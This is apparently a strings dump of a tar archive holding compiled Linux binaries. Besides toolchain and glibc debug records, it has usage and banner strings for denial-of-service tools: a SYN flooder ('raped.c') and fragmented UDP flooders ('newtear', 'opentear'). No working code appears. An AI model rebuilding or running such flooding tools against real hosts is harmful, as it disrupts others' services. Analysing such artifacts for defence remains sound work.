            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "newtear.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "getopt@@GLIBC_2.0",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/raped",
            "0100755",
            "0000000",
            "0000000",
            "00000036320",
            "07100656666",
            "013171",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "random",
            "memcpy",
            "perror",
            "socket",
            "abort",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "signal",
            "sendto",
            "memset",
            "srand",
            "time",
            "gethostbyname",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh\u050f",
            "QVhX",
            "E1fE",
            "fE1fu",
            "e[^]",
            "1fR}",
            "UTSE",
            "P7 }",
            "M@eM",
            "EeeeeeM",
            "e\u07c0e?fE",
            "8EfE(",
            "51fR",
            "fEE\u0700e",
            "fEnEj",
            "EPEPU",
            "\u0403;u[]",
            ":: exiting...",
            "-------------------",
            ":: raped.c by lst",
            "usage: %s <dst> <ports>",
            "\t<dst>   - destination host",
            "\t<ports> - ports to flood",
            ":: unknown host %s",
            ":: error: sending syn packet",
            ":: destination host - %s",
            ":: destination port(s)",
            " - %d",
            ":: error: can not open socket",
            ":: setsockopt",
            ":: raping...",
            ":: press ^C to end...",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "raped.c",
            "send_tcp_segment",
            "resolve_host",
            "portarray",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "signal@@GLIBC_2.0",
            "abort",
            "random@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "dsthost",
            "banner",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "ports",
            "srand@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "in_cksum",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/opentear",
            "0100755",
            "0000000",
            "0000000",
            "00000033507",
            "07100656650",
            "013710",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "memcpy",
            "perror",
            "malloc",
            "socket",
            "bzero",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "sendto",
            "bcopy",
            "time",
            "gethostbyname",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "QVhp",
            "EP } h+",
            "7E1fRE1fEP1fEPEPEPEP",
            " Eyt&",
            "]U4SE",
            "fEfUfME",
            "fEfE\u078bE",
            "EEEj",
            "EPEPw",
            "1fEP",
            "EPE@P",
            "1fEP",
            "1fEP",
            "U\u0709Pj",
            " u,h_",
            "Uu>E",
            "1'EP",
            "REPEP",
            "\u0403;u[]",
            "raw socket",
            "IP_HDRINCL",
            "Sending fragmented UDP flood.",
            "sendto",
            "%s dst_ip",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "opentear.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
